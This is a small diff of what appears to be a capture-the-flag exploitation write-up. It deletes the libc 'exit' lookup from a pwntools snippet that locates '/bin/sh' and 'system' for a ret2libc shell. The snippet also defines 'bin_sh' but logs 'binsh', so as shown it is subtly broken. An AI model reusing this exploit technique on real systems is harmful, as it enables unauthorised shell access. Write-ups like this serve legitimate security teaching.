@@ -190,7 +190,6 @@ system = libc.sym['system']
 ```python
 bin_sh = next(libc.search(b"/bin/sh"))
 system = libc.sym['system']
-exit = libc.sym['exit']
 
 log.info("/bin/sh = " + hex(binsh))
 log.info("system = " + hex(system))
